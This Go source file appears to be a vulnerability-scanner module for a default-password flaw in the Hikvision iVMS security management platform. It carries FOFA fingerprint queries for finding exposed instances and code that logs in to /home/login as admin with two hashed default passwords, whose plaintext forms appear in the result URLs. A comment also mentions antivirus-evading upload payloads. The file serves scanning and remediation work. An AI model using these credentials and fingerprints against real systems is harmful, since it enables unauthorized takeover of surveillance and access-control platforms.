package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HIKVISION iIVMS Default password Vulnerability",
    "Description": "<p>The product is a comprehensive security management platform from Hikvision that integrates video surveillance, intelligent analysis, access control, alarm management, and other security functions. An attacker can use this vulnerability to control the entire application platform.</p>",
    "Product": "HIKVISION-iVMS",
    "Homepage": "https://www.hikvision.com/",
    "DisclosureDate": "2023-11-15",
    "PostTime": "2024-03-20",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "(body=\"class=\\\"enname\\\">iVMS-4200\" && body=\"laRemPassword\") || (body=\"home/locationIndex.action?time=\" && body=\"result.data.indexUrl;\") || (body=\"//caoshiyan modify 2015-06-30 中转页面\" && body=\"/home/locationIndex.action?time=\" || body=\"home/licenseUpload.action\") || (body=\"class=\\\"out\\\"><a href=\\\"download/iVMS-\") || ((body=\"tab-border code-iivms\\\">\" || body=\"login?service=\" || body=\"/eop/common/css/reset.css\" || header=\"/cms/web/gateway/\"|| body=\"/cms/web/gateway/\" || header=\"/login?service=\" || title=\"iVMS\") && header=\"Server: If you want know, you can ask me\" && header!=\"404 Not Found\") || (body=\"var uuid = \\\"2b73083e-9b29-4005-a123-1d4ec47a36d5\\\"; // 用于检测VMS是否超时, chenliangyf1\") || (body=\"/cas/login\" && body=\"js/login/login.service.js\") || (body=\"daysOflicenseDatedWarn\" && body=\"/cas/login\") || (body=\"/ivms-ui/default/css/login.css\") || (server=\"Apache-Coyote/1.1\" && body=\"/baseui/js/plugins/ui/jquery.placeholder.js\") || (body=\"/cas/static/js/jquery.placeholder.js\") || (body=\"IVMS.files/logo.gif\") || (body=\"license!getExpireDateOfDays.action\" && body=\" window.document.location = '/license!getExpireDateOfDays.action';\") || (body=\"iVMS-A100\" && title=\"登录\") || (body=\"/error/browser.do\" && body=\"/portal\" && body=\"settings.skinStyle\" && (body=\"src=\\\"/portal/common/js/commonVar.js\" || body=\"nginxService/v1/download/InstallRootCert.exe\"))",
    "GobyQuery": "(body=\"class=\\\"enname\\\">iVMS-4200\" && body=\"laRemPassword\") || (body=\"home/locationIndex.action?time=\" && body=\"result.data.indexUrl;\") || (body=\"//caoshiyan modify 2015-06-30 中转页面\" && body=\"/home/locationIndex.action?time=\" || body=\"home/licenseUpload.action\") || (body=\"class=\\\"out\\\"><a href=\\\"download/iVMS-\") || ((body=\"tab-border code-iivms\\\">\" || body=\"login?service=\" || body=\"/eop/common/css/reset.css\" || header=\"/cms/web/gateway/\"|| body=\"/cms/web/gateway/\" || header=\"/login?service=\" || title=\"iVMS\") && header=\"Server: If you want know, you can ask me\" && header!=\"404 Not Found\") || (body=\"var uuid = \\\"2b73083e-9b29-4005-a123-1d4ec47a36d5\\\"; // 用于检测VMS是否超时, chenliangyf1\") || (body=\"/cas/login\" && body=\"js/login/login.service.js\") || (body=\"daysOflicenseDatedWarn\" && body=\"/cas/login\") || (body=\"/ivms-ui/default/css/login.css\") || (server=\"Apache-Coyote/1.1\" && body=\"/baseui/js/plugins/ui/jquery.placeholder.js\") || (body=\"/cas/static/js/jquery.placeholder.js\") || (body=\"IVMS.files/logo.gif\") || (body=\"license!getExpireDateOfDays.action\" && body=\" window.document.location = '/license!getExpireDateOfDays.action';\") || (body=\"iVMS-A100\" && title=\"登录\") || (body=\"/error/browser.do\" && body=\"/portal\" && body=\"settings.skinStyle\" && (body=\"src=\\\"/portal/common/js/commonVar.js\" || body=\"nginxService/v1/download/InstallRootCert.exe\"))",
    "Level": "2",
    "Impact": "<p> An attacker can use this vulnerability to control the entire application platform.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "海康威视综合安防平台默认口令漏洞",
            "Product": "HIKVISION-iVMS",
            "Description": "<p>该产品是海康威视公司推出的一款集视频监控、智能分析、门禁控制、报警管理等多种安防功能于一体的综合安防管理平台，攻击者可通过该漏洞控制整个应⽤平台。</p>",
            "Recommendation": "<p>1、修改默认⼝令，密码最好包含⼤⼩写字⺟、数字和特殊字符等，且位数⼤于8位。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p><p>3、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞控制整个应⽤平台。</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "HIKVISION iIVMS Default password Vulnerability",
            "Product": "HIKVISION-iVMS",
            "Description": "<p>The product is a comprehensive security management platform from Hikvision that integrates video surveillance, intelligent analysis, access control, alarm management, and other security functions. An attacker can use this vulnerability to control the entire application platform.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>&nbsp;An attacker can use this vulnerability to control the entire application platform.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10936"
}`
	uploadFilepoliteder := func(hostInfo *httpclient.FixUrl, username string, password string) (bool, error) {
		// 对于同名的文件只能上传一次,否则会被更改文件名，且有的系统可以上传，但对存在文件夹路径做了鉴权处理，访问需要权限,有的有防火墙，需要做免杀，故文件上传 payload 均做了免杀。POC检测的为成功上传且可以访问的
		uploadRequestConfig := httpclient.NewPostRequestConfig("/home/login")
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36")
		uploadRequestConfig.Header.Store("Connection", "close")
		uploadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		uploadRequestConfig.Header.Store("Origin", hostInfo.FixedHostInfo)
		uploadRequestConfig.Data = "username=" + username +"&password=" + password +"&pwdLevel=2&loginWay=1&clientIP=175.0.134.217&serviceIP=175.0.134.217&codeId=ac0821fe-6913-471b-8cac-f5bc3ef9b74b&vCode=a0721f92-20b0-448a-9e3d-6835aced8397&clientMAC=+&loginType=3&_eventId=submit&errorCode="
		//uploadRequestConfig.Data = "------WebKitFormBoundaryt1qdEWTI01cj5BLV\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"" + filename + "\"\r\nContent-Type: image/jpeg\r\n\r\n" + content + "\r\n------WebKitFormBoundaryt1qdEWTI01cj5BLV\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nupload\r\n------WebKitFormBoundaryt1qdEWTI01cj5BLV--\r\n"
		if resp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig); resp != nil && resp.StatusCode == 302 && strings.Contains(resp.Cookie, "secretKey") {
			return true, nil
		} else if err != nil {
			return false, err
		}
		return false, errors.New("漏洞利用失败")
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp1, _ := uploadFilepoliteder(hostInfo, "admin", "1058249C7206BA373765A1AE40BB4C77")
			if resp1 {
				ss.VulURL = hostInfo.Scheme() + "://" + "admin@hik12345+:" + hostInfo.HostInfo + "/home/login"
				return true
			}
			resp2, _ := uploadFilepoliteder(hostInfo, "admin", "9D561215F0198B2C25BDA3F77073AF31")
			if resp2 {
				ss.VulURL = hostInfo.Scheme() + "://"+ "admin@Hik12345++:" + hostInfo.HostInfo + "/home/login"
				return true
			}
			return false
		},
		nil,
	))
}
